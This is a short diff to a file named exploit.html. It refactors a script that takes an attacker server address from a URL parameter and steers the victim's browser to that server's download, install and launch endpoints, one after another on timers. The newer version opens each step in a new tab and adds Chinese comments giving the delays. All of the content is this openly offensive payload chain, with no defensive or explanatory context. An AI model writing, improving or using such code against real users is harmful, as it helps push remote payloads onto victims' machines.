@@ -1,18 +1,17 @@
 <!-- exploit.html -->
 <script>
-var yayquerystringyay = window.location.search;
-var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
-var yaypythonserveryay = yayurlparamsyay.get('yayattackeryay');
+const s = new URLSearchParams(location.search).get('yayattackeryay');
 
-location.href = "http://" + yaypythonserveryay + "/yaydownloadyay";
-const yaytimoutyay=setTimeout(yayinstallyay,15000);
 
-function yayinstallyay(){
-    location.href = "http://" + yaypythonserveryay + "/yayinstallyay";
-    const yaytimoutyay2=setTimeout(yaylaunchyay,30000);
-}
+window.open(`http://${s}/yaydownloadyay`, '_blank');
 
-function yaylaunchyay(){
-location.href = "http://" + yaypythonserveryay + "/yaylaunchyay";
-}
+// 15 秒后在新标签安装
+setTimeout(() => {
+  window.open(`http://${s}/yayinstallyay`, '_blank');
+
+  // 再等 15 秒启动
+  setTimeout(() => {
+    window.open(`http://${s}/yaylaunchyay`, '_blank');
+  }, 15000);
+}, 15000);
 </script>
